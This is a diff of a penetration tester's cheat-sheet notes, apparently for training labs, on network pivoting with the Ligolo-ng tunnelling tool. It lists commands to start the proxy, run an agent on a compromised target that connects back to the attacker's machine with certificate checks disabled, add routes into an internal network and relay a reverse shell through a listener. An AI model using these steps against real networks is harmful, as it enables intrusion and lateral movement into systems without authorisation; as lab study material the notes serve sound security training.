@@ -13,38 +13,22 @@
 
 {{{ # Redirection 
 
-
 # Ligolo-ng
 https://github.com/nicocha30/ligolo-ng
 
-
-# Adds a new tun interface to our machine.
-sudo ip tuntap add user kali mode tun ligolo
-
-# Enables the new interface.
-sudo ip link set ligolo up
-
-# Newer versions you can create the tunnel within the proxy
-
-
-# With the -selfcert flag the tool dynamically 
-# generates self-signed certificates.
-
+# start the proxy and create a tun interface
 ./proxy -selfcert
+interface_create
+iflist
 
-# The IP will be the IP of our Kali VM/attacking machine.
-# The -ignore-cert ignores certificate validation. 
-# This means we won't have any issues with our self-signed certs.
-
+# upload the appropriate agent to the target and connect back to kali
 ./agent -connect 10.10.14.213:11601 -ignore-cert
 
-
-# view sessions in proxy
+# Enter the new session and add a route and start the tunnel
 sessions
-
-# add a route to the new network
-sudo ip route add 172.16.5.0/24 dev ligolo
-
+route_add --name <INTERFACE_NAME> --route <NETWORK>
+route_list 
+tunnel_start --tun <INTERFACE_NAME>
 
 # reverse shell
 # Creates a listener on the machine where we're running the agent at port 1234
@@ -55,7 +39,6 @@ listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
 
 # view listeners
 listener_list
-
 
 
 }}}
